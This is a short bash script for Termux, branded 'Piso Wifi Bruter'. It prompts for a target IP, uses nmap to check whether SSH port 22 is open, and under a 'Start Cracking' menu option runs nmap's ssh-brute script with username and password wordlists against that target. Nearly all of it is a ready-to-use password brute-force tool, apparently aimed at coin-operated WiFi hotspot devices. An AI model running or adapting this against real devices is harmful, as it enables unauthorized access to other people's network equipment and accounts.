#!/data/data/com.termux/files/usr/bin/bash

# Check installed dependencies
function install_deps(){
	echo  "Piso Wifi Bruter" | toilet -f slant | lolcat
	echo ""
	echo -ne "\e[93m\e[1m[*] Checking dependencies... "
	for name in nmap toilet python php curl wget git ruby
	do
	  [[ $(which $name 2>/dev/null) ]] || { echo -en "\n\e[91m\e[1m[!] Package $name is not installed.\e[0m \n\e[93m\e[1m[!] Use 'pkg install $name' or 'sudo apt install $name'. \n\e[1m[!] Press Ctrl + C to Exit...\e[0m";deps=1; }
	done
	[[ $deps -ne 1 ]] && echo "OK" && sleep 3 || main || { echo -en "\n\e[0m\e[93m\e[1m[!] Install the above and rerun this script\e[0m\n" || exit 1; }
}

# Check if port 22 is open
function check_ssh(){
	echo "Port Checker" | toilet -f slant | lolcat
	echo -e "\e[1m\e[92m"
	read -p "[+] Enter target ip: " ip
	echo ""
	echo -e "\e[1m\e[93m[*] Checking if port 22 is open... "
	echo -e "\e[0m"
	
	server=$ip
	port=22                

	status=`nmap $server -Pn -p $port | egrep -io 'open|closed|filtered'`
	if [ $status == "open" ];then
	   echo ""
	   echo -e "\e[1m\e[92m[!] SSH Connection to $server over port $port is possible.\e[0m"
	   sleep 5
	elif [ $status == "filtered" ]; then
	   echo ""
	   echo -e "\e[1m\e[93m[!] SSH Connection to $server over port $port is possible but blocked by firewall.\e[0m"
	   sleep 5
	   clear && exit
	elif [ $status == "closed" ]; then
	   echo ""
	   echo -e "\e[1m\e[91m[!] SSH connection to $server over port $port is not possible.\e[0m"
	   sleep 5
	   clear && exit
	else
	   echo ""
	   echo -e "\e[1m\e[91m[!] Unable to get port $port status from $server \e[0m"
	   sleep 5
	fi
}

# Main function
function main(){
	install_deps
	check_ssh
	echo "Piso Wifi Bruter" | toilet -f slant | lolcat
	echo -e "\e[1m\e[92m"
	echo -e "[01] Start Cracking"
	echo -e "[00] Close Program"
	echo -e ""
	read -p "[+] Choose number: " method
	
	if [[ $method -eq 1 || $method -eq 01 ]]
	then
		echo -e "Cracking Login" | toilet -f slant | lolcat
		echo -e "\e[1m\e[92m"
		read -p "[+] Enter target ip: " ip
		echo -e "\e[0m"
		nmap $ip -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=password.txt
	elif [[ $method -eq 0 || $method -eq 00 ]]
	then
		xdg-open https://web.facebook.com/mkdirlove.git && exit
	else
		echo ""
		echo -e "\e[1m\e[91m[!] Invalid input, Please try again...\e[0m"
		xdg-open https://web.facebook.com/mkdirlove.git
		exit
	fi
}

# Main argument
main
